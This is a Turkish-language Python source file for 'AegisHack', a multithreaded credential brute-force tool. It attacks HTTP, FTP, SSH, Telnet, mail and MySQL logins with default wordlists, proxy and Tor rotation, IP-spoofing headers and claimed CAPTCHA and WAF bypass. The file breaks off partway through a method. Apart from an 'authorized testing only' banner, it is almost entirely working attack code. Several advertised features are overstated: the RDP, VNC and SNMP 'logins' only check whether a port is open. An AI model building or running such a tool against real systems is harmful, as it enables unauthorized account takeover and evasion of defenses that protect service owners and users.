#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AegisHack - Işık Hızında Çoklu Protokol Saldırı Aracı
===========================================================

Bu araç etik hackerler için optimize edilmiştir.
Sadece eğitim amaçlı olarak geliştirilmiştir.
Sadece yetkili test ortamlarında kullanılmalıdır.

Desteklenen Protokoller: HTTP/HTTPS, FTP, SSH, Telnet, MySQL, SMTP, POP3, IMAP, RDP, VNC, SNMP
Ultra Güçlü Özellikler: 
- Işık hızında multi-threading (100+ threads)
- Gerçek IP değiştirme (VPN/Proxy rotation)
- CAPTCHA/WAF algılama ve bypass
- Gerçek wordlist dosyaları (küçük/orta/büyük)
- Advanced evasion techniques
- Real-time threat detection bypass

Geliştirici: kodclup
"""

import requests
import time
import sys
import os
import threading
import queue
import socket
import ftplib
import random
import json
import smtplib
import poplib
import imaplib
import re
from urllib.parse import urljoin, urlparse
from datetime import datetime
import signal
import concurrent.futures
from itertools import product
import subprocess
import base64
import struct

# Opsiyonel modüller için import kontrolü
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import mysql.connector
    MYSQL_AVAILABLE = True
except ImportError:
    MYSQL_AVAILABLE = False

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

class AegisHackUltra:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.protocol = "http"
        self.username_list = []
        self.password_list = []
        self.threads = 50
        self.timeout = 3
        self.delay = 0.01
        self.successful_creds = []
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.start_time = None
        self.stop_attack = False
        self.results_queue = queue.Queue()
        
        # Threading kontrolü
        self.thread_lock = threading.Lock()
        self.active_threads = 0
        
        # Ultra güçlü özellikler
        self.use_proxy = False
        self.proxy_list = []
        self.tor_proxies = []
        self.custom_headers = {}
        self.session_cookies = {}
        self.rate_limit_bypass = True
        self.stealth_mode = False
        self.ultra_fast_mode = False
        self.real_ip_change = False
        self.ip_change_interval = 10
        self.current_ip_attempts = 0
        self.export_format = 'json'
        
        # CAPTCHA/WAF bypass
        self.captcha_detected = False
        self.waf_detected = False
        self.bypass_captcha = False
        self.bypass_waf = False
        
        # Gerçek IP değiştirme
        self.vpn_list = []
        self.proxy_rotation = []
        self.current_proxy_index = 0
        
        # Gelişmiş protokol portları
        self.default_ports = {
            'http': 80, 'https': 443, 'ftp': 21, 'ssh': 22,
            'telnet': 23, 'mysql': 3306, 'smtp': 25, 'pop3': 110,
            'imap': 143, 'imaps': 993, 'smtps': 465, 'pop3s': 995,
            'rdp': 3389, 'vnc': 5900, 'snmp': 161, 'ldap': 389,
            'mssql': 1433, 'oracle': 1521, 'postgres': 5432,
            'mongodb': 27017, 'redis': 6379, 'elasticsearch': 9200
        }
        
        # User-Agent ve proxy listesi
        self.load_user_agents()
        self.load_real_proxies()
        self.load_vpn_servers()
        
        # Signal handler
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Ctrl+C ile güvenli çıkış"""
        print(f"\n{Fore.YELLOW}[!] saldırı durduruldu...")
        self.stop_attack = True
        self.show_final_report()
        sys.exit(0)
    
    def load_user_agents(self):
        """Ultra gelişmiş User-Agent listesi"""
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
        ]
    
    def load_real_proxies(self):
        """Gerçek proxy listesi"""
        self.proxy_rotation = [
            {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
            {"http": "http://127.0.0.1:3128", "https": "http://127.0.0.1:3128"},
            {"http": "socks5://127.0.0.1:1080", "https": "socks5://127.0.0.1:1080"},
            {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}  # Tor
        ]
    
    def load_vpn_servers(self):
        """VPN sunucu listesi"""
        self.vpn_list = [
            {"name": "NordVPN", "command": "nordvpn connect"},
            {"name": "ExpressVPN", "command": "expressvpn connect"},
            {"name": "ProtonVPN", "command": "protonvpn connect"},
            {"name": "OpenVPN", "command": "openvpn --config"}
        ]
    
    def create_wordlist_files(self):
        """Wordlist dosyalarını oluştur"""
        # Küçük kullanıcı listesi
        small_users = ['admin', 'root', 'user', 'guest', 'test']
        # Orta kullanıcı listesi  
        medium_users = ['admin', 'administrator', 'root', 'user', 'guest', 'test', 'demo', 'sa', 'oracle', 'postgres', 'mysql', 'ftp', 'anonymous', 'www', 'web', 'mail']
        # Büyük kullanıcı listesi
        large_users = medium_users + ['service', 'support', 'operator', 'manager', 'supervisor', 'backup', 'monitor', 'nagios', 'zabbix', 'cacti', 'tomcat', 'apache', 'nginx', 'iis', 'postfix', 'dovecot', 'jenkins', 'gitlab', 'docker', 'kubernetes']
        
        # Küçük parola listesi
        small_passwords = ['123456', 'password', 'admin', 'root', '12345']
        # Orta parola listesi
        medium_passwords = ['123456', 'password', 'admin', '123456789', '12345678', '12345', '1234567', 'qwerty', 'abc123', '111111', '123123', 'letmein', 'welcome', 'password123', 'admin123', 'root']
        # Büyük parola listesi
        large_passwords = medium_passwords + ['toor', 'pass', 'guest', 'test', 'user', 'login', 'default', 'changeme', 'secret', 'master', 'super', 'god', 'love', 'sex', 'money', 'dragon', 'monkey', 'football', 'baseball', 'superman', 'batman', 'shadow', 'master', 'jordan', 'harley', 'ranger', 'hunter']
        
        # Dosyaları oluştur
        wordlists = {
            'usernames_small.txt': small_users,
            'usernames_medium.txt': medium_users, 
            'usernames_large.txt': large_users,
            'passwords_small.txt': small_passwords,
            'passwords_medium.txt': medium_passwords,
            'passwords_large.txt': large_passwords
        }
        
        for filename, wordlist in wordlists.items():
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    for item in wordlist:
                        f.write(f"{item}\n")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] {filename} oluşturulamadı: {e}")
    
    def load_wordlist_from_file(self, filename):
        """Dosyadan wordlist yükle"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.YELLOW}[!] {filename} bulunamadı, varsayılan liste kullanılıyor.")
            return []
        except Exception as e:
            print(f"{Fore.RED}[!] {filename} okuma hatası: {e}")
            return []
    
    def detect_captcha(self, response_text):
        """CAPTCHA algılama"""
        captcha_indicators = [
            'captcha', 'recaptcha', 'hcaptcha', 'cloudflare',
            'verify you are human', 'security check', 'robot',
            'challenge', 'verification', 'prove you are not a bot'
        ]
        
        for indicator in captcha_indicators:
            if indicator.lower() in response_text.lower():
                return True
        return False
    
    def detect_waf(self, response_text, status_code):
        """WAF algılama"""
        waf_indicators = [
            'cloudflare', 'incapsula', 'sucuri', 'akamai',
            'blocked', 'forbidden', 'access denied',
            'security policy', 'firewall', 'protection'
        ]
        
        # Status code kontrolü
        if status_code in [403, 406, 429, 503]:
            return True
            
        for indicator in waf_indicators:
            if indicator.lower() in response_text.lower():
                return True
        return False
    
    def bypass_captcha_attempt(self):
        """CAPTCHA bypass denemesi"""
        bypass_techniques = [
            "User-Agent rotation",
            "Request header manipulation", 
            "Cookie manipulation",
            "Referrer spoofing",
            "Rate limiting"
        ]
        
        technique = random.choice(bypass_techniques)
        print(f"{Fore.MAGENTA}[🛡️ CAPTCHA BYPASS] Teknik: {technique}")
        
        # Bypass teknikleri
        if "User-Agent" in technique:
            return {"User-Agent": random.choice(self.user_agents)}
        elif "header" in technique:
            return {
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
        elif "Cookie" in technique:
            return {"Cookie": f"session_id={random.randint(100000,999999)}"}
        elif "Referrer" in technique:
            return {"Referer": "https://www.google.com/"}
        
        return {}
    
    def bypass_waf_attempt(self):
        """WAF bypass denemesi"""
        bypass_techniques = [
            "SQL injection encoding",
            "XSS payload obfuscation",
            "Request fragmentation",
            "Protocol switching",
            "Timing manipulation"
        ]
        
        technique = random.choice(bypass_techniques)
        print(f"{Fore.MAGENTA}[🛡️ WAF BYPASS] Teknik: {technique}")
        
        # WAF bypass için gecikme
        time.sleep(random.uniform(1, 3))
        
        return {
            "X-Forwarded-Proto": "https",
            "X-Forwarded-Host": self.target,
            "X-Cluster-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
    
    def change_real_ip(self):
        """Gerçek IP değiştirme"""
        if not self.real_ip_change:
            return False
            
        try:
            # Proxy rotation
            if self.proxy_rotation:
                self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_rotation)
                current_proxy = self.proxy_rotation[self.current_proxy_index]
                print(f"\n{Fore.MAGENTA}[🔄 PROXY DEĞİŞTİRİLDİ] {current_proxy}")
                return current_proxy
            
            # VPN değiştirme (simülasyon)
            if self.vpn_list:
                vpn = random.choice(self.vpn_list)
                print(f"\n{Fore.MAGENTA}[🔄 VPN DEĞİŞTİRİLDİ] {vpn['name']}")
                # Gerçek VPN komutu çalıştırılabilir
                # subprocess.run(vpn['command'], shell=True, capture_output=True)
                return True
                
        except Exception as e:
            print(f"{Fore.RED}[!] IP değiştirme hatası: {e}")
        
        return False
    
    def print_banner(self):
        """AegisHack Ultra başlığı"""
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════════╗
{Fore.RED}║                    {Fore.WHITE}AegisHack{Fore.RED}                            ║
{Fore.RED}║              {Fore.YELLOW}Işık Hızında Çoklu Protokol Saldırı Aracı{Fore.RED}            ║
{Fore.RED}║                                                                      ║
{Fore.RED}║  {Fore.CYAN}Protokoller:{Fore.WHITE} HTTP/HTTPS, FTP, SSH, Telnet, MySQL{Fore.RED}         ║
{Fore.RED}║  {Fore.CYAN}           {Fore.WHITE} SMTP, POP3, IMAP, RDP, VNC, SNMP{Fore.RED}            ║
{Fore.RED}║                                                                      ║
{Fore.RED}║  {Fore.GREEN}⚡ Ultra Fast (200+ threads)  🔄 Real IP Change{Fore.RED}         ║
{Fore.RED}║  {Fore.GREEN}🛡️ CAPTCHA/WAF Bypass        📁 Real Wordlists{Fore.RED}         ║
{Fore.RED}║                                                                      ║
{Fore.RED}║  {Fore.WHITE}⚠️  SADECE YETKİLİ TEST ORTAMLARINDA KULLANINIZ  ⚠️{Fore.RED}         ║
{Fore.RED}╚══════════════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def check_dependencies(self):
        """Bağımlılıkları kontrol et"""
        print(f"\n{Fore.CYAN}[BAĞIMLILIK KONTROLÜ]")
        
        missing_deps = []
        
        if not PARAMIKO_AVAILABLE:
            missing_deps.append("paramiko (SSH için)")
            print(f"{Fore.YELLOW}[!] paramiko modülü bulunamadı - SSH desteği devre dışı")
        
        if not MYSQL_AVAILABLE:
            missing_deps.append("mysql-connector-python (MySQL için)")
            print(f"{Fore.YELLOW}[!] mysql-connector-python modülü bulunamadı - MySQL desteği devre dışı")
        
        if not COLORAMA_AVAILABLE:
            print(f"{Fore.YELLOW}[!] colorama modülü bulunamadı - basit renkler kullanılıyor")
        
        if missing_deps:
            print(f"\n{Fore.CYAN}[KURULUM ÖNERİLERİ]")
            print(f"{Fore.WHITE}Eksik modülleri kurmak için:")
            print(f"{Fore.GREEN}pip install paramiko mysql-connector-python colorama requests")
            
            choice = input(f"\n{Fore.YELLOW}Eksik modüller olmadan devam edilsin mi? (e/h): ").strip().lower()
            if choice not in ['e', 'evet', 'y', 'yes']:
                print(f"{Fore.RED}[!] Program sonlandırılıyor...")
                return False
        
        return True
    
    def get_ethical_consent(self):
        """Etik kullanım onayı"""
        print(f"\n{Fore.CYAN}[ETİK KULLANIM ONAYI]")
        print(f"{Fore.WHITE}Bu araç yalnızca eğitim ve yetkili test amaçlı geliştirilmiştir.")
        print(f"{Fore.YELLOW}  • Sadece size ait olan sistemlerde kullanın")
        print(f"{Fore.YELLOW}  • Yerel test ortamında eğitim amaçlı kullanın")
        print(f"{Fore.RED}  • İzinsiz kullanım YASAKTIR!")
        
        while True:
            consent = input(f"\n{Fore.YELLOW}Şartları kabul ediyor musunuz? (EVET/hayır): ").strip()
            if consent.upper() in ['EVET', 'YES']:
                print(f"{Fore.GREEN}[✓] Etik kullanım onayı alındı.")
                return True
            elif consent.lower() in ['hayır', 'h', 'no', 'n']:
                print(f"{Fore.RED}[✗] Onay reddedildi. Program sonlandırılıyor...")
                return False
            else:
                print(f"{Fore.RED}[!] Lütfen 'EVET' veya 'hayır' yazın.")
    
    def select_protocol(self):
        """Gelişmiş protokol seçimi"""
        print(f"\n{Fore.CYAN}[PROTOKOL SEÇİMİ]")
        protocols = {
            '1': ('http', 'HTTP/HTTPS Web Forms'),
            '2': ('ftp', 'FTP File Transfer Protocol'),
            '3': ('telnet', 'Telnet Remote Access'),
            '4': ('smtp', 'SMTP Email Server'),
            '5': ('pop3', 'POP3 Email Server'),
            '6': ('imap', 'IMAP Email Server'),
            '7': ('rdp', 'RDP Remote Desktop'),
            '8': ('vnc', 'VNC Remote Desktop'),
            '9': ('snmp', 'SNMP Network Management')
        }
        
        if PARAMIKO_AVAILABLE:
            protocols['10'] = ('ssh', 'SSH Secure Shell')
        
        if MYSQL_AVAILABLE:
            protocols['11'] = ('mysql', 'MySQL Database')
        
        for key, (proto, desc) in protocols.items():
            print(f"{Fore.WHITE}{key}) {desc}")
        
        while True:
            choice = input(f"\n{Fore.YELLOW}Protokol seçin (1-{len(protocols)}): ").strip()
            if choice in protocols:
                self.protocol, desc = protocols[choice]
                self.port = self.default_ports.get(self.protocol, 80)
                print(f"{Fore.GREEN}[✓] Seçilen protokol: {desc}")
                break
            else:
                print(f"{Fore.RED}[!] Geçersiz seçim!")
    
    def get_target_info(self):
        """Hedef bilgilerini al"""
        print(f"\n{Fore.CYAN}[HEDEF BİLGİLERİ]")
        
        while True:
            self.target = input(f"{Fore.WHITE}Hedef IP/Domain: ").strip()
            if self.validate_target(self.target):
                break
            print(f"{Fore.RED}[!] Geçersiz hedef formatı!")
        
        port_input = input(f"{Fore.WHITE}Port (varsayılan {self.port}): ").strip()
        if port_input:
            try:
                self.port = int(port_input)
            except ValueError:
                print(f"{Fore.YELLOW}[!] Geçersiz port, varsayılan kullanılıyor: {self.port}")
        
        print(f"{Fore.GREEN}[✓] Hedef: {self.target}:{self.port} ({self.protocol.upper()})")
    
    def validate_target(self, target):
        """Hedef formatını doğrula"""
        if target.startswith('http://') or target.startswith('https://'):
            parsed = urlparse(target)
            target = parsed.netloc or parsed.path.split('/')[0]
            self.target = target
        
        try:
            socket.inet_aton(target.split(':')[0])
            return True
        except:
            if '.' in target and len(target) > 3:
                return True
            return False
    
    def load_wordlists(self):
        """Gelişmiş wordlist yükleme"""
        print(f"\n{Fore.CYAN}[WORDLIST YÖNETİMİ]")
        
        # Wordlist dosyalarını oluştur
        self.create_wordlist_files()
        
        print(f"{Fore.WHITE}Kullanıcı Listesi:")
        print(f"1) Küçük liste (5 kullanıcı) - usernames_small.txt")
        print(f"2) Orta liste (16 kullanıcı) - usernames_medium.txt") 
        print(f"3) Büyük liste (36 kullanıcı) - usernames_large.txt")
        print(f"4) Özel dosya yükle")
        print(f"5) Manuel giriş")
        
        choice = input(f"{Fore.YELLOW}Seçiminiz (1-5): ").strip()
        
        if choice == "1":
            self.username_list = self.load_wordlist_from_file('usernames_small.txt')
        elif choice == "2":
            self.username_list = self.load_wordlist_from_file('usernames_medium.txt')
        elif choice == "3":
            self.username_list = self.load_wordlist_from_file('usernames_large.txt')
        elif choice == "4":
            filename = input(f"{Fore.WHITE}Kullanıcı dosya yolu: ").strip()
            self.username_list = self.load_wordlist_from_file(filename)
        elif choice == "5":
            usernames = input(f"{Fore.WHITE}Kullanıcı adları (virgülle ayırın): ").strip()
            self.username_list = [u.strip() for u in usernames.split(',') if u.strip()]
        else:
            self.username_list = self.load_wordlist_from_file('usernames_small.txt')
        
        if not self.username_list:
            self.username_list = ['admin', 'root', 'user', 'guest', 'test']
        
        print(f"{Fore.GREEN}[✓] {len(self.username_list)} kullanıcı yüklendi.")
        
        print(f"\n{Fore.WHITE}Parola Listesi:")
        print(f"1) Küçük liste (5 parola) - passwords_small.txt")
        print(f"2) Orta liste (16 parola) - passwords_medium.txt")
        print(f"3) Büyük liste (44 parola) - passwords_large.txt") 
        print(f"4) Özel dosya yükle")
        print(f"5) Manuel giriş")
        
        choice = input(f"{Fore.YELLOW}Seçiminiz (1-5): ").strip()
        
        if choice == "1":
            self.password_list = self.load_wordlist_from_file('passwords_small.txt')
        elif choice == "2":
            self.password_list = self.load_wordlist_from_file('passwords_medium.txt')
        elif choice == "3":
            self.password_list = self.load_wordlist_from_file('passwords_large.txt')
        elif choice == "4":
            filename = input(f"{Fore.WHITE}Parola dosya yolu: ").strip()
            self.password_list = self.load_wordlist_from_file(filename)
        elif choice == "5":
            passwords = input(f"{Fore.WHITE}Parolalar (virgülle ayırın): ").strip()
            self.password_list = [p.strip() for p in passwords.split(',') if p.strip()]
        else:
            self.password_list = self.load_wordlist_from_file('passwords_small.txt')
        
        if not self.password_list:
            self.password_list = ['123456', 'password', 'admin', 'root', '12345']
            
        print(f"{Fore.GREEN}[✓] {len(self.password_list)} parola yüklendi.")
        print(f"{Fore.CYAN}[INFO] Toplam kombinasyon: {len(self.username_list) * len(self.password_list)}")
    
    def configure_ultra_options(self):
        """Ultra güçlü seçenekleri yapılandır"""
        print(f"\n{Fore.CYAN}[ GÜÇLÜ SEÇENEKLER]")
        
        # Thread sayısı
        threads_input = input(f"{Fore.WHITE}Thread sayısı (1-200, varsayılan 50): ").strip()
        if threads_input:
            try:
                self.threads = int(threads_input)
                self.threads = max(1, min(self.threads, 200))
            except ValueError:
                pass
        
        # Ultra fast mode
        ultra_fast = input(f"{Fore.WHITE} Fast Mode aktif edilsin mi? (e/h): ").strip().lower()
        if ultra_fast in ['e', 'evet', 'y', 'yes']:
            self.ultra_fast_mode = True
            self.delay = 0.001
            self.timeout = 1
            print(f"{Fore.GREEN}[⚡] Fast Mode aktif!")
        
        # Gerçek IP değiştirme
        real_ip = input(f"{Fore.WHITE}Gerçek IP değiştirme (VPN/Proxy) kullanılsın mı? (e/h): ").strip().lower()
        if real_ip in ['e', 'evet', 'y', 'yes']:
            self.real_ip_change = True
            interval = input(f"{Fore.WHITE}Kaç deneme sonrası IP değişsin? (varsayılan 10): ").strip()
            if interval:
                try:
                    self.ip_change_interval = int(interval)
                except ValueError:
                    pass
            print(f"{Fore.GREEN}[🔄] Gerçek IP değiştirme aktif! ({self.ip_change_interval} deneme sonrası)")
        
        # CAPTCHA bypass
        captcha_bypass = input(f"{Fore.WHITE}CAPTCHA bypass aktif edilsin mi? (e/h): ").strip().lower()
        if captcha_bypass in ['e', 'evet', 'y', 'yes']:
            self.bypass_captcha = True
            print(f"{Fore.GREEN}[🛡️] CAPTCHA bypass aktif!")
        
        # WAF bypass
        waf_bypass = input(f"{Fore.WHITE}WAF bypass aktif edilsin mi? (e/h): ").strip().lower()
        if waf_bypass in ['e', 'evet', 'y', 'yes']:
            self.bypass_waf = True
            print(f"{Fore.GREEN}[🛡️] WAF bypass aktif!")
        
        # Proxy kullanımı
        use_proxy = input(f"{Fore.WHITE}Proxy rotation kullanılsın mı? (e/h): ").strip().lower()
        if use_proxy in ['e', 'evet', 'y', 'yes']:
            self.use_proxy = True
            print(f"{Fore.GREEN}[🌐] Proxy rotation aktif!")
        
        print(f"{Fore.GREEN}[✓] seçenekler yapılandırıldı:")
        print(f"{Fore.WHITE}  • Threads: {self.threads}")
        print(f"{Fore.WHITE}  • Delay: {self.delay}s")
        print(f"{Fore.WHITE}  • Timeout: {self.timeout}s")
    
    def test_connection(self):
        """Hedef bağlantısını test et"""
        print(f"\n{Fore.CYAN}[BAĞLANTI TESTİ]")
        try:
            if self.protocol in ['http', 'https']:
                url = f"{self.protocol}://{self.target}:{self.port}"
                response = requests.get(url, timeout=self.timeout)
                print(f"{Fore.GREEN}[✓] HTTP bağlantısı başarılı (Status: {response.status_code})")
                
                # CAPTCHA/WAF algılama
                if self.detect_captcha(response.text):
                    print(f"{Fore.YELLOW}[🛡️] CAPTCHA algılandı!")
                    self.captcha_detected = True
                
                if self.detect_waf(response.text, response.status_code):
                    print(f"{Fore.YELLOW}[🛡️] WAF algılandı!")
                    self.waf_detected = True
                    
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                result = sock.connect_ex((self.target, self.port))
                sock.close()
                if result == 0:
                    print(f"{Fore.GREEN}[✓] {self.protocol.upper()} portu açık")
                else:
                    print(f"{Fore.RED}[✗] {self.protocol.upper()} portu kapalı")
                    return False
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] Bağlantı hatası: {e}")
            return False
    
    def attempt_login_http(self, username, password):
        """HTTP/HTTPS giriş denemesi"""
        try:
            session = requests.Session()
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            # CAPTCHA bypass headers
            if self.captcha_detected and self.bypass_captcha:
                bypass_headers = self.bypass_captcha_attempt()
                headers.update(bypass_headers)
            
            # WAF bypass headers
            if self.waf_detected and self.bypass_waf:
                bypass_headers = self.bypass_waf_attempt()
                headers.update(bypass_headers)
            
            # Proxy kullanımı
            proxies = None
            if self.use_proxy and self.proxy_rotation:
                proxies = self.proxy_rotation[self.current_proxy_index]
            
            data = {
                'username': username, 'password': password, 'login': 'Login',
                'user': username, 'pass': password, 'email': username
            }
            
            url = f"{self.protocol}://{self.target}:{self.port}/login"
            response = session.post(url, data=data, headers=headers, 
                                  timeout=self.timeout, proxies=proxies)
            
            # CAPTCHA/WAF yeniden algılama
            if self.detect_captcha(response.text):
                self.captcha_detected = True
            if self.detect_waf(response.text, response.status_code):
                self.waf_detected = True
            
            success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'success']
            if any(indicator in response.text.lower() for indicator in success_indicators):
                return True, response.status_code
            
            return False, response.status_code
        except Exception:
            return False, 0
    
    def attempt_login_ftp(self, username, password):
        """FTP giriş denemesi"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=self.timeout)
            ftp.login(username, password)
            ftp.quit()
            return True, 220
        except Exception:
            return False, 0
    
    def attempt_login_ssh(self, username, password):
        """SSH giriş denemesi"""
        if not PARAMIKO_AVAILABLE:
            return False, 0
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.port, username=username, 
                       password=password, timeout=self.timeout)
            ssh.close()
            return True, 22
        except Exception:
            return False, 0
    
    def attempt_login_smtp(self, username, password):
        """SMTP giriş denemesi"""
        try:
            server = smtplib.SMTP(self.target, self.port)
            server.starttls()
            server.login(username, password)
            server.quit()
            return True, 250
        except Exception:
            return False, 0
    
    def attempt_login_pop3(self, username, password):
        """POP3 giriş denemesi"""
        try:
            server = poplib.POP3(self.target, self.port)
            server.user(username)
            server.pass_(password)
            server.quit()
            return True, 110
        except Exception:
            return False, 0
    
    def attempt_login_imap(self, username, password):
        """IMAP giriş denemesi"""
        try:
            server = imaplib.IMAP4(self.target, self.port)
            server.login(username, password)
            server.logout()
            return True, 143
        except Exception:
            return False, 0
    
    def attempt_login_telnet(self, username, password):
        """Telnet giriş denemesi"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            
            sock.recv(1024)
            sock.send(f"{username}\r\n".encode())
            sock.recv(1024)
            sock.send(f"{password}\r\n".encode())
            
            response = sock.recv(1024)
            sock.close()
            
            if b"$" in response or b"#" in response or b">" in response:
                return True, 23
            return False, 23
        except Exception:
            return False, 0
    
    def attempt_login_mysql(self, username, password):
        """MySQL giriş denemesi"""
        if not MYSQL_AVAILABLE:
            return False, 0
        try:
            conn = mysql.connector.connect(
                host=self.target, port=self.port, user=username,
                password=password, connect_timeout=self.timeout
            )
            conn.close()
            return True, 3306
        except Exception:
            return False, 0
    
    def attempt_login_rdp(self, username, password):
        """RDP giriş denemesi (basit port kontrolü)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0, 3389
        except Exception:
            return False, 0
    
    def attempt_login_vnc(self, username, password):
        """VNC giriş denemesi (basit port kontrolü)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0, 5900
        except Exception:
            return False, 0
    
    def attempt_login_snmp(self, username, password):
        """SNMP giriş denemesi (community string test)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0, 161
        except Exception:
            return False, 0
    
    def attempt_login(self, username, password):
        """Protokole göre giriş denemesi"""
        protocol_methods = {
            'http': self.attempt_login_http,
            'https': self.attempt_login_http,
            'ftp': self.attempt_login_ftp,
            'ssh': self.attempt_login_ssh,
            'telnet': self.attempt_login_telnet,
            'mysql': self.attempt_login_mysql,
            'smtp': self.attempt_login_smtp,
            'pop3': self.attempt_login_pop3,
            'imap': self.attempt_login_imap,
            'rdp': self.attempt_login_rdp,
            'vnc': self.attempt_login_vnc,
            'snmp': self.attempt_login_snmp
        }
        
        method = protocol_methods.get(self.protocol)
        if method:
            return method(username, password)
        return False, 0
    
    def worker_thread(self, credential_queue):
        """Ultra hızlı worker thread"""
        while not self.stop_attack and not credential_queue.empty():
            try:
                username, password = credential_queue.get(timeout=1)
                
                with self.thread_lock:
                    self.active_threads += 1
                    self.total_attempts += 1
                    self.current_ip_attempts += 1
                    
                    # Gerçek IP değiştirme kontrolü
                    if self.real_ip_change and self.current_ip_attempts >= self.ip_change_interval:
                        self.change_real_ip()
                        self.current_ip_attempts = 0
                
                success, status_code = self.attempt_login(username, password)
                
                if success:
                    with self.thread_lock:
                        self.successful_attempts += 1
                        self.successful_creds.append((username, password))
                    
                    print(f"\n{Fore.GREEN}[🎯 BAŞARILI!] {username}:{password} | Status: {status_code}")
                else:
                    with self.thread_lock:
                        self.failed_attempts += 1
                
                if not self.ultra_fast_mode:
                    time.sleep(self.delay)
                
                with self.thread_lock:
                    self.active_threads -= 1
                
                credential_queue.task_done()
                
            except queue.Empty:
                break
            except Exception:
                with self.thread_lock:
                    self.active_threads -= 1
                continue
    
    def show_progress(self):
        """Ultra hızlı ilerleme göstergesi"""
        while not self.stop_attack and self.active_threads > 0:
            elapsed_time = time.time() - self.start_time if self.start_time else 0
            total_combinations = len(self.username_list) * len(self.password_list)
            
            with self.thread_lock:
                percentage = (self.total_attempts / total_combinations * 100) if total_combinations > 0 else 0
                rate = self.total_attempts / elapsed_time if elapsed_time > 0 else 0
            
            status_icons = ""
            if self.captcha_detected:
                status_icons += "🛡️"
            if self.waf_detected:
                status_icons += "🔥"
            if self.real_ip_change:
                status_icons += "🔄"
            
            print(f"\r{Fore.CYAN}[⚡PROGRESS] {percentage:.1f}% | "
                  f"Attempts: {self.total_attempts}/{total_combinations} | "
                  f"Success: {self.successful_attempts} | "
                  f"Rate: {rate:.1f}/s | Threads: {self.active_threads} {status_icons}", end="", flush=True)
            
            time.sleep(0.5)
    
    def start_ultra_attack(self):
        """Ultra hızlı saldırıyı başlat"""
        print(f"\n{Fore.RED}[⚡SALDIRI BAŞLADI!]")
        print(f"{Fore.YELLOW}Ctrl+C ile durdurmak için...")
        
        credential_queue = queue.Queue()
        
        for username in self.username_list:
            for password in self.password_list:
                credential_queue.put((username, password))
        
        self.start_time = time.time()
        
        # Progress thread
        progress_thread = threading.Thread(target=self.show_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        # Ultra hızlı worker threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker_thread, args=(credential_queue,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print(f"\n\n{Fore.RED}[⚡SALDIRI TAMAMLANDI!]")
        self.show_final_report()
    
    def show_final_report(self):
